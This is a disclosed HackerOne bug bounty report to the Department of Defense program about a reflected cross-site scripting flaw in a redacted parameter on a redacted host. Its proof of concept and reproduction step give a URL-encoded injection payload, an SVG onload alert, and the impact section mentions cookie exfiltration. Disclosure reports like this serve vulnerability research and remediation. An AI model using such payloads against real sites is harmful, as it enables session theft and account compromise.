# Reflected XSS at https://██████/██████████ via "████████" parameter

## Report Details
- **Report ID**: 1457413
- **URL**: https://hackerone.com/reports/1457413
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-01-21T13:18:59.639Z
- **Disclosed**: 2022-02-14T21:19:22.778Z

## Reporter
- **Username**: pelegn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
There is Reflected Cross site scripting issue at the following url:

[https://█████/████](https://██████████/██████████)
Proof Of Concept

https://████████/███████?text=&███=%22%3E%3Csvg/onload=alert(1)%3E████

███████


Best Regards
@pelegn

## Impact

Cookies Exfiltration
SOAP Bypass
CORS Bypass
Executing javascript on the victim behalf

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Navigate to https://█████████/███?text=&███████=%22%3E%3Csvg/onload=alert(1)%3E██████

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
